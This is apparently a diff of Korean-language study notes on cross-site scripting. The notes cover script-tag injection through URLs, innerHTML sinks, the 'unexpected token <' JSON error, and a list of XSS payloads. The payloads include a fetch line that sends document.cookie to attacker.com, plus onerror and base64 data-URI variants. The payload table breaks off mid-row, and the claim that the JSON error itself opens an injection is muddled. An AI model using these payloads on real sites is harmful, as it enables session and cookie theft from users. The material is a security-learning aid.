@@ -1,4 +1,4 @@
-
+(1)
 * 네가 URL 뒤에 `<script></script>`를 붙이니까,
 * **페이지의 원래 HTML `<script>` 태그 일부가 화면에 노출됨**.
 
@@ -155,3 +155,162 @@ HTML 파서(브라우저의 DOM 해석기)의 동작 방식
 여기에서 `[[INPUT_HERE]]` 자리에 `</script><script>/*payload*/</script>`를 넣으면 바로 XSS가 되는 거지.
 
 ---
+
+(2)
+```
+innerhtml과 fetch(웹 서버에 GET 또는 POST 요청을 보내고, 서버에서 돌아오는 응답을 받아 JSON, HTML, 텍스트 등으로 반환)
+```
+
+`"unexpected token '<', '<!doctype' is not valid json"` 오류는 보통 **JavaScript**에서 **JSON 파싱**을 시도할 때, **HTML** 형식의 응답을 받은 경우 발생합니다. 예를 들어, 서버가 예상대로 **JSON 응답**을 보내야 하는데, 실제로는 **HTML** 페이지(대개 오류 페이지)가 반환되었을 때 이런 오류가 발생할 수 있습니다.
+
+이 경우, XSS (Cross-Site Scripting) 공격을 진행하는 방법에 대해 설명할 수 있습니다. XSS 공격은 웹 애플리케이션에 악성 스크립트를 삽입하여 **사용자에게 악성 코드를 실행**시키는 방법입니다. **`unexpected token '<'`** 오류 메시지는 **HTML 응답**에서 악성 스크립트를 삽입할 수 있는 기회를 제공합니다.
+
+### XSS 공격의 기본 원리
+
+1. **HTML 문서 내 스크립트 삽입**: XSS 공격자는 **`<script>`** 태그나 **`onerror`**, **`onclick`** 등의 이벤트 핸들러를 사용하여 악성 JavaScript를 삽입합니다.
+2. **DOM 조작**: 삽입된 스크립트는 **DOM**을 조작하여 **쿠키 탈취**, **세션 하이재킹**, **피싱 공격** 등을 수행할 수 있습니다.
+
+### `unexpected token '<'` 오류 발생 시 공격할 수 있는 XSS 페이로드 예시
+
+#### 1. **기본적인 XSS 공격**
+
+만약 HTML 문서 내에서 `<script>` 태그를 포함시킬 수 있다면, 공격자는 JavaScript 코드를 실행시킬 수 있습니다.
+
+```html
+<script>alert('XSS');</script>
+```
+
+이 코드는 **브라우저**에서 실행되며, **경고창**이 나타나게 됩니다.
+
+#### 2. **쿠키 탈취를 위한 XSS 페이로드**
+
+공격자는 악성 스크립트를 사용하여 **쿠키**를 **탈취**할 수 있습니다. 다음과 같은 XSS 페이로드를 사용할 수 있습니다:
+
+```html
+<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
+```
+
+이 페이로드는 사용자의 **쿠키** 정보를 **attacker.com**으로 전송합니다.
+
+#### 3. **DOM-based XSS (DOM을 통한 XSS)**
+
+만약 페이지 내에서 **사용자 입력을 동적으로 처리**하고 그 데이터를 HTML에 삽입한다면, XSS 공격이 발생할 수 있습니다. 예를 들어, 다음과 같은 페이로드가 있을 수 있습니다:
+
+```html
+<input type="text" id="search" value="foo">
+<script>
+  document.getElementById('search').value = '<img src="x" onerror="alert(1)">';
+</script>
+```
+
+위 코드는 **이미지 오류**를 유발하여 **`onerror`** 이벤트 핸들러가 \*\*`alert(1)`\*\*을 실행하도록 합니다.
+
+### **사용자 입력을 동적으로 처리하는지 확인하는 방법**
+
+1. **폼 입력 필드**나 **검색창**에서 입력한 값이 즉시 페이지에 반영되는지 확인합니다.
+
+   * 예를 들어, 사용자가 **검색어**를 입력하면, 페이지가 새로고침 없이 **검색어를 포함한 결과**를 바로 표시하는 경우, 해당 데이터는 동적으로 처리되고 있습니다.
+2. **JavaScript를 통해 값이 DOM에 삽입되는지 확인**:
+
+   * **웹 페이지의 HTML 구조**를 살펴보면, **브라우저 개발자 도구**(F12)를 열고 **Elements** 탭에서 HTML을 실시간으로 확인할 수 있습니다.
+   * 예를 들어, **사용자가 검색어**를 입력한 후, JavaScript 코드가 **`document.getElementById()`** 또는 \*\*`innerHTML`\*\*을 사용하여 입력 값을 HTML 페이지에 삽입하는 방식이라면, 그 페이지는 동적 처리를 하고 있습니다.
+
+#### **동적 처리가 어떻게 이루어지는지 예시로 설명**
+
+1. **사용자 입력 받기**: 예를 들어, 검색창에 사용자가 입력한 값을 페이지에 반영한다고 가정해봅시다.
+
+   ```html
+   <input type="text" id="search">
+   <button onclick="search()">Search</button>
+   <div id="result"></div>
+   ```
+
+2. **JavaScript 코드**: 사용자가 **Search** 버튼을 클릭하면, 검색어를 가져와서 결과를 페이지에 보여주는 코드입니다.
+
+   ```javascript
+   function search() {
+       var query = document.getElementById('search').value;  // 검색어 가져오기
+       document.getElementById('result').innerHTML = query;  // 검색어를 결과에 반영
+   }
+   ```
+
+3. **동적으로 HTML에 삽입**: 사용자가 입력한 검색어는 `document.getElementById('result').innerHTML`을 통해 \*\*`<div id="result"></div>`\*\*에 삽입됩니다. **이 값은 HTML로 직접 삽입**되므로, 사용자가 입력한 값에 악성 코드가 포함되면 XSS 공격에 취약해질 수 있습니다.
+
+---
+
+### **사용자 입력을 HTML에 삽입하는 방법**
+
+**가장 일반적인 방법**은 \*\*`innerHTML`\*\*을 사용하는 것입니다.
+
+#### **1. innerHTML을 통한 삽입**
+
+`innerHTML`은 **HTML 요소의 콘텐츠**를 **동적으로 변경**할 때 사용됩니다. 그러나 이 방법을 사용하면 **사용자가 입력한 값**이 **HTML로 해석**되기 때문에, XSS 공격에 취약할 수 있습니다.
+
+**예시**:
+
+```javascript
+var userInput = document.getElementById('userInput').value;  // 사용자의 입력값
+document.getElementById('output').innerHTML = userInput;  // 입력값을 HTML에 삽입
+```
+
+* **위 코드**는 사용자가 **`<input>`** 필드에 입력한 값을 \*\*`<div id="output">`\*\*에 삽입합니다.
+* 만약 사용자가 `"<script>alert('XSS')</script>"`와 같은 값을 입력하면, **스크립트 코드**가 실행될 수 있습니다
+**`innerText`** 또는 \*\*`textContent`\*\*는 HTML 태그를 포함한 텍스트를 삽입할 수 없으며, **순수 텍스트**만을 삽입할 수 있습니다. 따라서 XSS 공격을 방어할 수 있는 안전한 방법입니다.
+
+
+#### 4. **이벤트 핸들러를 통한 XSS**
+
+사용자가 클릭하거나 다른 이벤트를 트리거할 때 XSS를 발생시킬 수 있습니다. 예를 들어, `<a>` 태그나 `<img>` 태그에 **이벤트 핸들러**를 삽입할 수 있습니다.
+
+```html
+<img src="x" onerror="alert('XSS');">
+```
+
+위와 같이 **이미지 로드 오류**를 이용해 **`onerror`** 이벤트가 실행될 때 \*\*`alert('XSS')`\*\*가 실행됩니다.
+
+#### 5. **Base64로 인코딩된 스크립트 삽입**
+
+만약 `<script>` 태그를 직접 삽입할 수 없다면, Base64 인코딩을 사용하여 **스크립트**를 삽입할 수 있습니다. 예를 들어:
+
+```html
+<script src="data:text/javascript;base64,dmFyIG5hbWUgPSAic3RhY2sgY2FwIjs="></script>
+```
+
+위의 페이로드는 **Base64**로 인코딩된 **JavaScript** 코드가 실행됩니다. Base64로 인코딩된 값은 다음과 같습니다:
+
+```javascript
+var name = "stack cap";
+```
+
+#### 6. **JSON 응답이 잘못 처리된 경우의 XSS**
+
+`unexpected token '<'` 오류는 **JSON 데이터**를 예상했는데 **HTML 페이지**가 반환되는 경우에 발생하는데, **HTML 응답을 JavaScript에서 처리**하는 상황에서 **XSS 공격**이 발생할 수 있습니다. 예를 들어:
+
+```javascript
+fetch('/api/data')
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('output').innerHTML = data.message;
+  })
+  .catch(error => {
+    console.error(error);
+  });
+```
+
+여기서 `data.message`가 HTML로 반환되는 경우, 예를 들어:
+
+```json
+{
+  "message": "<script>alert('XSS')</script>"
+}
+```
+
+위와 같은 JSON 응답이 반환되면, \*\*`data.message`\*\*가 HTML로 삽입되어 **XSS**가 실행됩니다.
+
+### **XSS 페이로드 정리**
+
+| 공격 방법        | 페이로드 예시                                             | 설명                           |
+| ------------ | --------------------------------------------------- | ---------------------------- |
+| **기본적인 XSS** | `<script>alert('XSS');</script>`                    | 페이지에 스크립트 삽입하여 JavaScript 실행 |
+| **쿠키 탈취**    | \`<script>fetch('[http://attacker](http://attacker) |                              |
+
